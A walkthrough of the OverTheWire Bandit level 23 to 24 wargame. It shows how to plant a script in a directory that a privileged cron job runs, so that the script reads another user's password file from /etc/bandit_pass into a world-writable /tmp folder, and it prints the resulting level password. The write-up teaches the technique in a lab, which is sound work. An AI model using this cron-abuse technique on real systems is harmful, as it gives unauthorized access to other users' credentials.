### Level23->Level24


```bash 
ssh -p 2220 bandit23@bandit.labs.overthewire.org
```

In this level you need to check `/etc/cron.d/` as before, and you'll also need to write a shellscript. 


Here's the crontab file. 


```bash
cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```


I created a folder under `/tmp`.


```bash 
mktemp -d 
/tmp/tmp.bb5asiXtP5

cd /tmp/tmp.bb5asiXtP5
```


Then I wrote a shellscript like this and made a file named `password`. 


```bash
#!/bin/bash 

cat /etc/bandit_pass/bandit24 > /tmp/tmp.bb5asiXtP5/password
```

Then give the appropriate permissions to the directory and the bash script. 


```bash
chmod +x solve.sh 
chmod 777 -R /tmp/tmp.bb5asiXtP5
```


Copy the shell script to the directory where the crontab is running.


```bash
cp /tmp/tmp.bb5asiXtP5/solve.sh /var/spool/bandit24/foo
```


Wait for a minute and `crontab` will show you the password.  


```bash 
cat password 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```


Copying the shellscript to `/var/spool/bandit24/foo` was the whole point because as the shellscript said 

it executes all the scripts in `/var/spool/$myname/foo:` and then deletes all the files.


This level was pretty hard as well.